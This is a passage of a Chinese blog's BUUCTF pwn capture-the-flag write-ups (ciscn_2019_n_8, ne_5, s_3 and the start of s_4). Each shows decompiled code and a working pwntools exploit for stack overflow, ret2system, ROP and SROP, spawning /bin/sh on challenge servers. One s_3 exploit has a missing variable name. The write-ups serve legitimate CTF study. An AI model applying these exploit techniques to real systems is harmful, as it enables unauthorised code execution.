class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>context的类型一定要写</strong></p>
<h2 id="ciscn_2019_n_8"><a class="markdownIt-Anchor" href="#ciscn_2019_n_8"></a> ciscn_2019_n_8</h2>
<h3 id="1checksec-30"><a class="markdownIt-Anchor" href="#1checksec-30"></a> 1.checksec()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/root/download/BUUCTF/ciscn_2019_n_8/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>全保护，我尿了</p>
<h3 id="2ida-29"><a class="markdownIt-Anchor" href="#2ida-29"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);            <span class="comment">// ====+STACK_OVERFLOW+====</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一个输入让var[13]为17可以进入,不管用啥方式，覆盖52个位置就可以传递17这个数字了，超级简单</p>
</blockquote>
<h3 id="3exp-21"><a class="markdownIt-Anchor" href="#3exp-21"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26629</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_n_8&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">52</span> + p32(<span class="number">17</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_ne_5"><a class="markdownIt-Anchor" href="#ciscn_2019_ne_5"></a> ciscn_2019_ne_5</h2>
<h3 id="1checksec-31"><a class="markdownIt-Anchor" href="#1checksec-31"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-30"><a class="markdownIt-Anchor" href="#2ida-30"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+8h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+88h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x60</span>u);</span><br><span class="line">  *(_DWORD *)src = <span class="number">0x30</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x7C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf((<span class="type">int</span>)<span class="string">&quot;%100s&quot;</span>, (<span class="type">int</span>)s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">    __isoc99_scanf((<span class="type">int</span>)<span class="string">&quot;%d&quot;</span>, (<span class="type">int</span>)&amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        AddLog((<span class="type">int</span>)src);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Display(src);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Print();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        GetFlag(src);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>GetFlag</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [esp+4h] [ebp-44h]</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">0x30</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>取程序里面fflush的sh填入system参数+栈溢出</p>
</blockquote>
<h3 id="3exp-22"><a class="markdownIt-Anchor" href="#3exp-22"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26685</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_ne_5&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = <span class="number">0x080482E0</span>+<span class="number">0xA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(sys_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input admin password:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0.Exit\n:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input new log info:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0.Exit\n:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_s_3"><a class="markdownIt-Anchor" href="#ciscn_2019_s_3"></a> ciscn_2019_s_3</h2>
<h3 id="1checksec-32"><a class="markdownIt-Anchor" href="#1checksec-32"></a> 1.checksec()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@joe1sn:~/download/BUUCTF/ciscn_2019_s_3# checksec ciscn_s_3</span><br><span class="line">[*] &#x27;/root/download/BUUCTF/ciscn_2019_s_3/ciscn_s_3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-31"><a class="markdownIt-Anchor" href="#2ida-31"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vuln</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; syscall; LINUX - sys_read &#125;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>居然是汇编，这种题从来没遇见过</p>
<p>不过看得出来(结合汇编)</p>
<p>sys_write：向栈上写数据(0x400)</p>
<p>sys_read：从栈上读数据(0x30)</p>
</blockquote>
<p>查了查WP</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/github_36788573/article/details/103541178">https://blog.csdn.net/github_36788573/article/details/103541178</a></p>
<ul>
<li>3WriteUp分析</li>
<li>主要是gadget函数有东西</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     rax, Fh</span><br><span class="line">retn</span><br><span class="line">mov     rax, 59</span><br><span class="line">retn</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">&#125; // starts at 4004D6</span><br></pre></td></tr></table></figure>
<p>先是向rax传递了0xf，在linux的系统调用表示</p>
<blockquote>
<p>sys_rt_sigreturn(unsigned long _unused)</p>
</blockquote>
<p>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。</p>
<p>向rax传递了59，在linux的系统调用表示</p>
<blockquote>
<p>sys_exec(const char *filename,const char *const argv[],const char *,const envp[])</p>
</blockquote>
<p>就相当于system函数</p>
<p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
<p><strong>这就引申出两种解题方法</strong></p>
<h4 id="41-59号系统调用"><a class="markdownIt-Anchor" href="#41-59号系统调用"></a> 4.1 59号系统调用</h4>
<p>ropgadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004004a3 : mov byte ptr [rip + 0x200b86], 1 ; ret</span><br><span class="line">0x00000000004004e3 : mov eax, 0x3b ; ret</span><br><span class="line">0x00000000004004db : mov eax, 0xf ; ret</span><br><span class="line">0x00000000004004d8 : mov ebp, esp ; mov rax, 0xf ; ret</span><br><span class="line">0x00000000004004e2 : mov rax, 0x3b ; ret</span><br><span class="line">0x00000000004004da : mov rax, 0xf ; ret</span><br><span class="line">0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a2 : pop r15 ; ret</span><br><span class="line">0x00000000004004a2 : pop rbp ; mov byte ptr [rip + 0x200b86], 1 ; ret</span><br><span class="line">0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400440 : pop rbp ; ret</span><br><span class="line">0x00000000004005a3 : pop rdi ; ret</span><br><span class="line">0x00000000004005a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004003a9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 18</span><br></pre></td></tr></table></figure>
<h5 id="3exp-23"><a class="markdownIt-Anchor" href="#3exp-23"></a> 3.EXP</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26249</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x04004ED</span></span><br><span class="line">execv = <span class="number">0x04004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x04005A3</span></span><br><span class="line">pop_5_ret = <span class="number">0x040059A</span></span><br><span class="line">mov_RDX_r13  =<span class="number">0x0400580</span></span><br><span class="line">sys_write = <span class="number">0x0400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">  = u64(p.recv(<span class="number">8</span>)) - <span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>( ))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(pop_5_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64( +<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_RDX_r13) + p64(execv)</span><br><span class="line">payload += p64(pop_rdi) + p64( ) + p64(sys_write)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这个EXP是可以打通的，看上去和普通write泄露libc的EXP差不多</p>
<p>其实包含了很多汇编的底层知识</p>
<h4 id="42framingsignals-areturntoportableshellcode"><a class="markdownIt-Anchor" href="#42framingsignals-areturntoportableshellcode"></a> 4.2FramingSignals-AReturntoPortableShellcode</h4>
<h5 id="srop"><a class="markdownIt-Anchor" href="#srop"></a> <strong>SROP</strong></h5>
<p><a target="_blank" rel="noopener" href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">FramingSignals-AReturntoPortableShellcode</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = sys</span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def debug(addr):</span></span><br><span class="line"><span class="string">    raw_input(&#x27;debug:&#x27;)</span></span><br><span class="line"><span class="string">    gdb.attach(io, &quot;b *&quot; + addr)</span></span><br><span class="line"><span class="string">debug(&#x27;0x400514&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()  </span><br></pre></td></tr></table></figure>
<p><strong>参考南梦的打法</strong><br />
[CTF-BUUCTF-Pwn刷题之旅-](<a target="_blank" rel="noopener" href="https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/">https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</a></p>
<h2 id="ciscn_2019_s_4"><a class="markdownIt-Anchor" href="#ciscn_2019_s_4"></a> ciscn_2019_s_4</h2>
<h3 id="1checksec-33"><a class="markdownIt-Anchor" href="#1checksec-33"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-32"><a class="markdownIt-Anchor" href="#2ida-32"></a> 2.IDA</h3>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span 